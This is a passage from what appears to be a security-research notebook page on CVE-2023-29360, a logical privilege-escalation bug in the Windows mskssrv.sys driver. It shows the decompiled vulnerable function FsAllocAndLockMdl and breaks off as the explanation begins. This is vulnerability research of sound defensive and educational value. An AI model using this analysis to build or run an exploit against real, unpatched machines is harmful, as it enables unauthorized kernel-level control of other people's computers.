# https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360

<!DOCTYPE html><html lang="en" class="rounded-corners theme-clean no-tint sidebar-default sidebar-list-default links-default depth-subtle __variable_7d5705 __variable_4d8f45 __variable_7857c7 font-Inter sheet-open:gutter-stable dark" style="color-scheme: dark;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Bug CVE : CVE-2023â€“29360</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Bug type : Logical bug leading to LPE<!-- --></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Integrity needed : Medium for kernel address leak</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Tested on : Windows 10</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Vulnerable Driver : <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">mskssrv.sys</code></p><h2 id="bug-details" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#bug-details"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_8d8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_8d8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Bug Details</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This is a logical bug arising in function <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FsAllocAndLockMdl</code> inside <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">mskssrv.sys</code> driver in windows.</p><div class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs" style="background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit;color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"><code id="_S_1_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">NTSTATUS</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">__fastcall</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">FsAllocAndLockMdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">void</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">*</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">AddressPtr</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">ULONG</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">Length</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">struct</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">_MDL</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">**</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">OutputMdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">{</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  NTSTATUS v4</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">//</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> edi</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">struct</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">_MDL</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">*</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">Mdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">//</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> rax</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">struct</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">_MDL</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">*</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">v6</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">//</span><span style="color:light-dark(rgb(var(--neutral-9)), rgb(var(--neutral-9)));--shiki-light:rgb(var(--neutral-9));--shiki-dark:rgb(var(--neutral-9))"> rbx</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content">
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  v4 </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">if</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">!</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">AddressPtr </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">||</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">!</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">Length </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">||</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">!</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">OutputMdl </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">return</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> STATUS_INVALID_PARAMETER</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  Mdl </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">IoAllocateMdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">AddressPtr</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> Length</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0i64</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">);</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  v6 </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> Mdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">if</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">!</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">Mdl </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">return</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> STATUS_INSUFFICIENT_RESOURCES</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">MmProbeAndLockPages</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">Mdl</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> KernelMode</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> IoWriteAccess</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">);</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">*</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">OutputMdl </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> v6</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">  </span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">return</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> v4</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">}</span></span></span></code></pre></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This is the vulnerable code snippet that is responsible for the bug. As visible, the function is responsible for creating a <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">MDL</code> from the <code class="py-px px-1.5 